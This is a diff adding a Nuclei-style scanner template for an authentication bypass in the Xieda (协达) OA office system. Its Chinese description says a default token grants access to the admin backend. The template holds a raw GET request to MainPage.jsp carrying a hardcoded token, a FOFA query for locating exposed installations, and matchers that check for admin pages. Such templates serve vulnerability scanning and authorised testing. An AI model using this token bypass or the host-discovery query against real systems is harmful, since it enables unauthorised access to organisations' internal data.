@@ -1,0 +1,25 @@
+id: ahctop-OA-MainPage-bypassauth
+
+info:
+  name: 协达OA系统绕过登录认证登陆后台
+  author: linfeng7z
+  severity: high
+  description: 协达OA系统是一款全面先进的OA系统。协达OA存在登录认证绕过漏洞，攻击者利用默认的token登陆系统后台。
+  tags: bypassauth,iedoo,oa
+  metadata:
+    fofa-qeury: body="/interface/CheckLoginName.jsp"
+    veified: true
+
+http:
+  - raw:
+      - |
+        GET /stylei/MainPage.jsp?token=YXR-YMD-SYQ-TOKEN HTTP/1.1
+        Host: {{hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, '通讯录') || contains(body, '系统管理') || contains(body, '安徽协达软件科技有限公司')"
+        condition: and
